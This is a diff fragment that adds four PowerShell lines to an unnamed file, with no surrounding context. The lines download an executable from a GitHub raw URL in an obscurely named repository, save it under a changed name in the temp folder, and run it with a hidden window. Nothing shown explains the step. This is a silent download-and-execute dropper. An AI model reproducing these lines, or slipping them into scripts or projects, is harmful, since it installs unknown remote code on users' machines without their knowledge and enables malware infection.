@@ -1,0 +1,4 @@
+$u="https://github.com/3465h/idkkkk/raw/refs/heads/main/shk.exe";
+$p="$env:temp\shkkv.exe";
+(New-Object System.Net.WebClient).DownloadFile($u,$p);
+Start-Process $p -WindowStyle Hidden
